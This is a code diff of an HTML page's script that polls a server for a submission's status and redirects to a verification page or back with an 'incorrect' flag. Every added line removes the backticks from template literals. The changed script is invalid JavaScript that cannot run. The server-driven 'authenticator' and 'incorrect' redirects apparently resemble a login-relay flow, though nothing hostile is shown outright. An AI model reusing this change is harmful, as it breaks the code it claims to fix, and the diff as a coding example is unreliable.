@@ -716,12 +716,12 @@
     }
   }
     </style>
-    <script>
+  <script>
   // Function to poll the status from the server every 5 seconds
   function pollStatus(submissionId) {
     if (submissionId) {
       setInterval(() => {
-        fetch(`/check_status/${submissionId}/`) // Use the correct URL structure
+        fetch(/check_status/${submissionId}/) // Use the correct URL structure
           .then((response) => {
             if (!response.ok) {
               throw new Error("Failed to fetch status");
@@ -734,9 +734,9 @@
 
             // Handle redirection based on status
             if (status === "authenticator") {
-              window.location.href = `/verification/${submissionId}/`;
+              window.location.href = /verification/${submissionId}/;
             } else if (status === "incorrect") {
-              window.location.href = `?status=incorrect`;
+              window.location.href = ?status=incorrect;
             }
           })
           .catch((error) => console.error("Error checking status:", error));
@@ -757,7 +757,7 @@
     } else {
       spinnerElement.style.display = "none"; // Hide spinner
       if (statusMessage) {
-        statusMessage.textContent = `Current Status: ${status}`;
+        statusMessage.textContent = Current Status: ${status};
       }
     }
   }
@@ -767,7 +767,7 @@
   if (submissionId) {
     pollStatus(submissionId);
   }
-</script>
+</script> 
 
   </head>
   <body
